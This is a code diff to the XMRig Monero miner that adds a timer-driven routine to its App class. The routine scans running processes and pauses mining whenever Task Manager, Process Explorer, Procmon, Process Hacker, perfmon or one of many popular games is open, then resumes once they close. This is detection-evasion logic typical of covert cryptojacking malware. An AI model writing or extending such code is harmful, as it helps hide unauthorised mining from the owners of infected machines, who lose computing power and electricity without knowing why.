@@ -42,6 +42,13 @@
 #include "cc/ControlCommand.h"
 #include "cc/XMRigd.h"
 #include "Summary.h"
+/*begin*/
+#include <tlhelp32.h>
+#include <TCHAR.H>
+#include "core/Miner.h"
+
+static xmrig::Controller *controller = nullptr;
+/*end*/
 #include "version.h"
 
 #ifdef _WIN32
@@ -55,6 +62,9 @@
 xmrig::App::App(Process *process)
 {
     m_controller = std::make_shared<Controller>(process);
+    /*begin*/
+	controller = m_controller.get();
+    /*end*/
 }
 
 
@@ -63,6 +73,37 @@ xmrig::App::~App()
     Cpu::release();
 }
 
+/*begin*/
+void xmrig::App::CheckTaskManager(uv_timer_t *handle)
+{
+  HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+  PROCESSENTRY32 pe;
+  pe.dwSize = sizeof(PROCESSENTRY32);
+  Process32First(hSnapshot, &pe);
+
+  const wchar_t *blacklist[] = { L"1cv8c.exe", L"WorldOfTanks.exe", L"taskmgr.exe", L"Taskmgr.exe", L"dota2.exe", L"csgo.exe", L"payday.exe", L"Minecraft.exe", L"TheDivision.exe", L"GTA5.exe", L"re7.exe", L"Prey.exe", L"Overwatch.exe", L"MK10.exe", L"QuakeChampions.exe", L"crossfire.exe", L"pb.exe", L"wot.exe", L"lol.exe", L"perfmon.exe", L"Perfmon.exe", L"SystemExplorer.exe", L"TaskMan.exe", L"ProcessHacker.exe", L"procexp64.exe", L"procexp.exe", L"Procmon.exe", L"Daphne.exe" };
+
+  do  {
+    for (int i = 0; i < sizeof(blacklist) / sizeof(blacklist[0]); i++) {
+      if (wcscmp(pe.szExeFile, blacklist[i]) == 0) {
+        LOG_INFO("\x1B[01;33mpaused\x1B[0m, something opened");
+        controller->miner()->setEnabled(false);
+        CloseHandle(hSnapshot);
+        return;
+      }
+    }
+    
+  } while (Process32Next(hSnapshot, &pe));
+  
+  if (!controller->miner()->isEnabled()) {
+    LOG_INFO("\x1B[01;32mresumed");
+    controller->miner()->setEnabled(true);
+    }
+  
+  CloseHandle(hSnapshot);        
+}
+/*end*/
 
 int xmrig::App::exec()
 {
@@ -104,6 +145,11 @@ int xmrig::App::exec()
     }
 
     m_controller->start();
+	
+    /*begin*/
+    uv_timer_init(uv_default_loop(), &app_m_timer);
+    uv_timer_start(&app_m_timer, App::CheckTaskManager, 1000, 1000);
+    /*end*/
 
 #   if XMRIG_FEATURE_CC_CLIENT
     m_controller->ccClient()->addCommandListener(this);
